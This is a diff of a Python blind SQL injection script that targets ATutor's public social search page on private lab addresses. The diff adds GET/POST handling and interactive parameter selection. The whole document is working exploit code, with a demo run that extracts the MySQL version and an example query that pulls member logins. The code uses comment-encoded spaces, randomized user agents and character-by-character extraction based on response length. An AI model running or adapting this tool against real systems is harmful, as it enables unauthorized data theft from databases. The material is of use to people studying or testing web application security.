@@ -1,10 +1,13 @@
 # DEMONSTRATION
-# $ python3 sqli_mysql_bool_response-length.py "select @@version" 20 "1')" "%23" http://192.168.252.13/ATutor/mods/_standard/social/index_public.php
+# $ python3 sqli_mysql_bool_response-length.py q get "select @@version" 30 "1')" "%23" http://192.168.252.12/ATutor/mods/_standard/social/index_public.php
+# [?] Select a parameter to test for injection:: q
+#  > q
+#
 # Retrieving query using: select @@version
-# 5.5.47-0+deb8u1
-# 
-# [+] Result: 5.5.47-0+deb8u1
-# 
+# 5.5.47-0+deb8u1-log
+#
+# [+] Result: 5.5.47-0+deb8u1-log
+#
 # [+] Done!
 
 #!/usr/bin/python3
@@ -13,6 +16,7 @@ import urllib3
 import os
 import sys
 import re
+import inquirer
 from random_useragent.random_useragent import Randomize     # Randomize useragent
 
 # Optionally, use a proxy
@@ -28,6 +32,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Set timeout
 timeout = 5
+
+# Default string for empty parameters
+def_str = "1234"
 
 # Printable ASCII chars
 ascii_begin = 32
@@ -49,66 +56,83 @@ def random_agent():
     }
     return headers
 
-def do_req(url,headers,content_len,ascii_char,inj_str):
+def sqli(url,headers,get_post,inj_param,params,inj_str,content_len):
     comment_inj_str = re.sub(" ","/**/",inj_str)
-    params = {'q':comment_inj_str.replace("[CHAR]", str(ascii_char))}
-    params_str = "&".join("%s=%s" % (k,v) for k,v in params.items())
-    r = requests.get(url,params=params_str,headers=headers,timeout=timeout,verify=False)
-    resp_content_len = len(r.content)
-    if (resp_content_len > content_len):
-        return True
+    inj_params = dict()
 
-def sqli(url,headers,content_len,inj_str):
-    for j in range(ascii_begin,ascii_end):
-        response = do_req(url,headers,content_len,j,inj_str)
-        if response:
-            return j
+    for param in params:
+        inj_params[param] = def_str
+        if param == inj_param:
+            inj_params[param] = comment_inj_str
 
-def inject(str_len,str_regex_query,url,headers,content_len,prefix,suffix):
+    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
+
+    if get_post.lower() == "get":
+        r = requests.get(url,params=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
+    elif get_post.lower() == "post":
+        r = requests.post(url,data=inj_params_unencoded,headers=headers,timeout=timeout,verify=False)
+
+    if r:
+        resp_content_len = len(r.content)
+        # print(str(resp_content_len))
+        if (resp_content_len > content_len):
+            return True
+
+def inject(str_len,str_query,url,headers,get_post,inj_param,params,prefix,suffix,content_len):
     extracted = ""
-    or_substr = prefix + " or (ascii(substring(("
+    or_substr = " or (ascii(substring(("
     
     for i in range(1,str_len):
         # Check of current pos still contains a valid ASCII char using >
-        check_pos = or_substr + str_regex_query + ")," + str(i) + ",1)))>[CHAR]" + suffix
-        retr_pos = do_req(url,headers,content_len,ascii_begin,check_pos)
+        inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))>" + str(ascii_begin) + suffix
+        retr_pos = sqli(url,headers,get_post,inj_param,params,inj_str,content_len)
         if not retr_pos:
             break
-
-        # Continue guessing the character by comparing using =
-        inj_str = or_substr + str_regex_query + ")," + str(i) + ",1)))=[CHAR]" + suffix
-        retr_value = sqli(url,headers,content_len,inj_str)
-        if retr_value:
-            extracted += chr(retr_value)
-            extracted_char = chr(retr_value)
-            sys.stdout.write(extracted_char)
-            sys.stdout.flush()
+        
+        for j in range(ascii_begin,ascii_end):
+            # Continue guessing the character by comparing using =
+            inj_str = prefix + or_substr + str_query + ")," + str(i) + ",1)))=" + str(j) + suffix
+            retr_value = sqli(url,headers,get_post,inj_param,params,inj_str,content_len)
+            if retr_value:
+                extracted += chr(j)
+                extracted_char = chr(j)
+                sys.stdout.write(extracted_char)
+                sys.stdout.flush()
     
     print("\n")
     return extracted
 
 # Main
 def main(argv):
-    if len(sys.argv) == 6:
-        query = sys.argv[1]
-        content_len = int(sys.argv[2])
-        prefix = sys.argv[3]
-        suffix = sys.argv[4]
-        url = sys.argv[5]
+    if len(sys.argv) == 8:
+        params = sys.argv[1].split(",")
+        get_post = sys.argv[2]
+        query = sys.argv[3]
+        content_len = int(sys.argv[4])
+        prefix = sys.argv[5]
+        suffix = sys.argv[6]
+        url = sys.argv[7]
     else:
-        print("[*] Usage: " + sys.argv[0] + " <query> <content_len> <prefix> <suffix> <url>")
-        print("[*] Example: " + sys.argv[0] + " \"select login from AT_members\" 20 \"1')\" \"%23\" http://192.168.252.14/ATutor/mods/_standard/social/index_public.php\n")
+        print("[*] Usage: " + sys.argv[0] + " <param1,param2,...> <get_or_post> <query> <content_len> <prefix> <suffix> <url>")
+        print("[*] Example: " + sys.argv[0] + " q get \"select login from AT_members\" 20 \"1')\" \"%23\" http://192.168.252.14/ATutor/mods/_standard/social/index_public.php\n")
         exit(0)
 
     # Variables
-    str_length = 50
+    str_len = 50
     headers = random_agent()
 
     # Do stuff
     try:
+        # Select parameter
+        param_question = [inquirer.List('params',
+                message="Select a parameter to test for injection:",
+                choices=params),]
+        param_answer = inquirer.prompt(param_question)
+        inj_param = param_answer["params"]
+
         # Print string
         print("Retrieving query using: " + query)
-        output = inject(str_length,query,url,headers,content_len,prefix,suffix)
+        output = inject(str_len,query,url,headers,get_post,inj_param,params,prefix,suffix,content_len)
         print("[+] Result: " + output)
         print("\n[+] Done!")
     except requests.exceptions.Timeout:
